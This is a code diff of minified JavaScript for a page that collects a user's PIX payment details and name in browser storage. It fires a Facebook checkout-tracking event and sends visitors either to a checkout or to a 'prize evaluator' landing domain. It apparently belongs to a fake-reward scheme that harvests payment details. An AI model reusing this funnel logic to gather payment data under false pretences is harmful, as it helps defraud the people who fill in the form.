@@ -401,7 +401,7 @@
                     try {
                         if (Object.values(S).every(e => e))
                             localStorage.setItem("kwai-pix-details", JSON.stringify(S)),
-                                sessionStorage.setItem("userName", S.name),
+                            localStorage.setItem("userName", S.name),
                                 j("confirm");
                         else
                             throw Error("Please fill in all PIX details")
@@ -413,29 +413,31 @@
                     await new Promise(e => setTimeout(e, 1e3)),
                         j("result")
                 }
-                , K = () => {
+                ,  K = () => {
                     window.fbq && window.fbq("track", "InitiateCheckout");
+                  
                     function hasAllURLParameters(names) {
-                        const urlParams = new URLSearchParams(window.location.search);
-                        return names.every(param => urlParams.has(param));
+                      const urlParams = new URLSearchParams(window.location.search);
+                      return names.every(param => urlParams.has(param));
                     }
-
+                  
                     const requiredParams = ['CampaignID', 'adSETID', 'CreativeID', 'pixel_id'];
                     if (!hasAllURLParameters(requiredParams)) {
-                        window.location.href = 'https://appavaliadorpremios.shop/lp/';
+                      window.location.href = 'https://appavaliadorpremios.shop/lp/';
                     } else {
-                        const urlParams = new URLSearchParams(window.location.search);
-                        // Se existir um input com id "name", pega o seu valor e adiciona à query string
-                        const storedName = sessionStorage.getItem('userName');
-                        if (storedName) {
-                            urlParams.set('name', storedName);
-                        }
-                        const utms = urlParams.toString();
-                        const redirectUrl = "/checkout/" + (utms ? `?${utms}` : '');
-                        window.location.href = redirectUrl;
+                      const urlParams = new URLSearchParams(window.location.search);
+                  
+                      // Recupera o nome do usuário do localStorage
+                      const storedName = localStorage.getItem('userName');
+                      if (storedName) {
+                        urlParams.set('name', storedName);
+                      }
+                  
+                      const utms = urlParams.toString();
+                      const redirectUrl = "/checkout/" + (utms ? `?${utms}` : '');
+                      window.location.href = redirectUrl;
                     }
-
-                }
+                  }
                 ;
             return (() => {
                 switch (v) {
